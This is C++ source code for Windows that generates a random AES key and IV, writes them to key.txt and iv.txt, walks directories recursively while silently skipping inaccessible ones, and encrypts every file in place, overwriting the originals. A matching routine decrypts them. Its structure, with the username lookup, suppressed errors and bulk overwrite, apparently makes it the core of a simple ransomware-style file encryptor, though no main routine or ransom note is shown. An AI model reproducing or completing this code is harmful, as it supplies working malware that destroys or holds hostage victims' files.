#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <random>
#include <windows.h>
#include <lmcons.h>
#include "AES_128_CBC.h"

namespace fs = std::filesystem;

const int size = 16;

const std::string keyFilename = "key.txt";
const std::string ivFilename = "iv.txt";

//This function is used to retrieve the username.
std::string getCurrentUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    return std::string(username);
}

//This function is used to generate a random key and IV
void generateKeyAndIV(uint8_t *key, uint8_t *iv, int size)
{
    std::random_device rd;
    std::mt19937 gen(rd());

    std::uniform_int_distribution<> dis(0, 255);

    // Generate random key
    for (int i = 0; i < size; ++i)
    {
        key[i] = static_cast<uint8_t>(dis(gen));
        iv[i] = static_cast<uint8_t>(dis(gen));
    }
}

//This function is used to save data to a file.
void saveToFile(const std::string &filename, const uint8_t *data, int size)
{
    std::ofstream file(filename, std::ios::binary);
    if (file.is_open())
    {
        file.write(reinterpret_cast<const char *>(data), size);
        file.close();
    }
}

//This function is used to read data from a file.
void readFromFile(const std::string &filename, uint8_t *data, int size)
{
    std::ifstream file(filename, std::ios::binary);
    if (file.is_open())
    {
        file.read(reinterpret_cast<char *>(data), size);
        file.close();
    }
}

//This function is used to check whether a file exists or not.
bool filesExist(const std::string &file1, const std::string &file2)
{
    return (fs::exists(file1) && fs::exists(file2));
}

//This function is used to check if a file doesn't exists , it will generate key and IV.
void genKeyIfNeeded(uint8_t *key, uint8_t *iv)
{
    if (!filesExist(keyFilename, ivFilename))
    {
        generateKeyAndIV(key, iv, size);
        saveToFile(keyFilename, key, size);
        saveToFile(ivFilename, iv, size);
    }
}

//Declare the FileItem struct.
struct FileItem
{
    std::string name;
    bool isDirectory;
};

//This function is used to list files and directories.
std::vector<FileItem> listFilesAndDirectories(const std::string &path, bool skipNonAccessible = false)
{
    std::vector<FileItem> result;
    try
    {
        for (const auto &entry : fs::directory_iterator(path))
        {
            if (skipNonAccessible) {
                try {
                    fs::directory_iterator test(entry.path());
                }
                catch(const std::exception& e) {
                    //std::cerr << "Error opening directory: " << entry.path().string() << std::endl;
                    continue; // Skip this iteration and move to the next one
                }
            }

            if (fs::is_directory(entry.path()))
            {
                result.push_back({entry.path().filename().string(), true});
            }
            else
            {
                result.push_back({entry.path().filename().string(), false});
            }
        }
    }
    catch (const fs::filesystem_error &e)
    {
        //std::cerr << "Error: " << e.what() << std::endl;
    }
    return result;
}

//This function is used to increase the size of a string to the nearest multiple of 16.
std::string increaseSizeofString(const std::string &input)
{
    size_t currentSize = input.size();
    size_t newSize = ((currentSize + 15) / 16) * 16;
    if (newSize > currentSize)
    {
        return input + std::string(newSize - currentSize, '\0');
    }
    return input;
}

//This function is used to read the content of a file into a single string.
std::string readFiles(const std::string &filePath)
{
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return "";
    }

    // Determine file size
    file.seekg(0, std::ios::end);
    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Read the entire file content into a string
    std::string fileContent(fileSize, '\0');
    file.read(&fileContent[0], fileSize);
    file.close();

    // Increase size to nearest multiple of 16 if necessary
    fileContent = increaseSizeofString(fileContent);

    return fileContent;
}

//This function is used to encrypt files.
void enc(const std::vector<FileItem> &items, const std::string &prefix, const std::string &currentPath, const uint8_t *key, const uint8_t *iv)
{
    for (const auto &item : items)
    {
        if (item.isDirectory)
        {
            std::string newPath = currentPath + item.name + "\\";
            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
            enc(subItems, prefix + "  ", newPath, key, iv);
        }
        else
        {
            std::string fileContent = readFiles(currentPath + item.name);
            int fileSize = fileContent.size();
            std::vector<uint8_t> data(fileSize);
            for (size_t i = 0; i < fileSize; i++)
            {
                data[i] = static_cast<uint8_t>(fileContent[i]);
            }

            AES_CTX ctx;
            AES_EncryptInit(&ctx, key, iv);

            for (unsigned int offset = 0; offset < fileSize; offset += 16)
            {
                AES_Encrypt(&ctx, data.data() + offset, data.data() + offset);
            }
            saveToFile(currentPath + item.name, data.data(), fileSize);
        }
    }
}

//This function is used to decrypt files.
void dec(const std::vector<FileItem> &items, const std::string &prefix, const std::string &currentPath, const uint8_t *key, const uint8_t *iv)
{
    for (const auto &item : items)
    {
        if (item.isDirectory)
        {
            std::string newPath = currentPath + item.name + "\\";
            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
            dec(subItems, prefix + "  ", newPath, key, iv);
        }
        else
        {
            std::string fileContent = readFiles(currentPath + item.name);
            int fileSize = fileContent.size();
            std::vector<uint8_t> data(fileSize);
            for (size_t i = 0; i < fileSize; i++)
            {
                data[i] = static_cast<uint8_t>(fileContent[i]);
            }

            AES_CTX ctx;
            AES_DecryptInit(&ctx, key, iv);

            for (unsigned int offset = 0; offset < fileSize; offset += 16)
            {
                AES_Decrypt(&ctx, data.data() + offset, data.data() + offset);
            }
            saveToFile(currentPath + item.name, data.data(), fileSize);
        }
    }
}